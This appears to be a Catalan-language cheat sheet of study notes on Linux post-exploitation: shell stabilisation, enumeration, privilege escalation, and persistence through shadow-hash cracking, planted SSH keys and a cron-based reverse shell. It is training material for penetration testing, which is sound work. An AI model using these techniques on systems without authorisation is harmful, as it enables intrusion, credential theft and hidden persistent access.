## Utilities
##### Tractament de la TTY
```bash
# Bash
1. script /dev/null -c bash
#Python
1. python -c 'import pty; pty.spawn("/bin/bash")'

2. [Ctrl+Z] stty raw -echo; fg
3. reset xterm
4. export TERM=xterm
5. export SHELL=bash
6. stty rows [x] columns [y]
```
##### Transferència de fitxers
```bash
python3 -m http.server [port] # Atacant
wget [url] -O [output] # Víctima
```
## Local enumeration
--> **Hostname, distribution, release version, kernel, arch, cpu, disk, mounts, packages**
```
uname -a
env
lscpu
df -h
dpkg -l
```
--> **Users, groups, current user, privileges**
```
whoami
groups [user]
cat /etc/passwd | grep 'sh$'
lastlog
```
--> **IP, network adapter, internal network, TCP/UDP services, other hosts**
```
ip a
cat /etc/resolv.conf
ip neighbour
route
```
--> **Running services, cron jobs**
```
ps aux | grep [user]
top
crontab -l
ls -la /etc/cron*
cat /etc/cron*
```
> Es pot automatitzar a través de [LinEnum](https://github.com/rebootuser/LinEnum) o [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).
## Privilege escalation
##### Cron Jobs
Són scripts que s'executen de forma automàtica cada període de temps assignat, que pot anar des d'un cop per minut fins un cop al mes, i amb els permisos de l'usuari que l'ha creat. Poden ser vulnerables a escalat de privilegis si:
1. Els ha creat un usuari privilegiat.
2. Són editables/vulnerable o criden un script que és editable/vulnerable.
Els Cron Jobs tenen la següent estructura:
```
* * * * * [command]
|  | | | |______ Dia de la setmana
|  | | |__________ Mes
|  | |_________________ Dia del mes
|  |______________________ Hora
|___________________________ Minut
``` 
##### SUID Binaries
Els bits SUID d'un binari són un tipus de permisos que es poden atorgar als arxius per a que s'executin sempre amb els privilegis del propietari i no de l'usuari actual. Estan representats als permisos amb una lletra "S". Alguns programes propietat de root tenen el bit SUID per defecte però no són vulnerables, com _ping_ o _chsh_. Per saber si un binari és vulnerable es pot consultar a [GTFOBins](https://gtfobins.github.io/).
Es poden trobar tots els binaris amb SUID:
```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null # propietat de root
```
##### Abusing Sudo
_Sudo_ (Super User DO), és una comanda de Linux que permet executar una comanda amb permisos de root. Per a poder utilitzar-la, fa falta que l'usuari estigui dins de l'arxiu _/etc/sudoers_, i pot ser que només tingui permisos per executar alguna comanda específica. De nou, es pot consultar si una comanda és vulnerable a [GTFOBins](https://gtfobins.github.io/).
Per veure quins permisos de sudo té l'usuari actual s'ha de fer:
```bash
sudo -l
```
##### Kernel exploits
Al llarg de les versions del kernel de Linux s'han trobat vulnerabilitats que permeten escalar privilegis. L'enumeració amb [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) fa una comprovació de les principals vulnerabilitats (com DirtyCow o Pkexec) i reporta si són explotables o no.

> La Santa Bíblia del PrivEsc a Linux: [Linux PrivEsc](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/).
## Persistence
##### Dumping hashes
L'arxiu _/etc/shadow_, només accessible amb permisos de root, conté els hashes de les credencials dels usuaris. Si s'aconsegueixen aquests hashes, es poden ficar en un arxiu i crackejar amb Hashcat.
```bash
hasid -m [hash] # saber quin tipus de hash és i el id de hashcat
hashcat -a 0 -m [id] -w [wordlist] [hashes_file]
```
##### SSH Keys
L'autenticació per clau de SSH és asimètrica, és a dir, funciona amb un parell de claus relacionades on una és pública i serveix per encriptar, i l'altra és privada i serveix per desencriptar i accedir al host remot. N'hi ha amb diferents tipus d'encriptació, tot i que la més típica és la RSA. 

Tenint la clau privada d'un usuari és possible autenticar-se com aquest, i amb permisos d'escriptura és possible afegir un parell de claus propi al directori ssh de l'usuari: _~/.ssh/authorized_keys_.

**Autenticació amb clau privada**
```bash
ssh -i [ssh_private_key] [user]@[host] 
```

**Generació d'un nou parell de claus**
```bash
# Atacant
ssh-keygen -t rsa -b 4096 # demanarà on guardar-les i amb quin nom
chmod 600 [ssh-key]

# Víctima
> Copiar la clau pública al authorized_keys
```
##### Cron Jobs
Es pot crear un Cron Job que, amb la freqüència que designem, intenti establir una reverse shell al nostre host per a poder-nos connectar quan ho desitgem.
```bash
echo "* * * * * [revese shell]" > [file] # Cada minut
crontab -i [file]
```

> La Santa Bíblia de la persistència a Linux: [Linux Persistence](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/).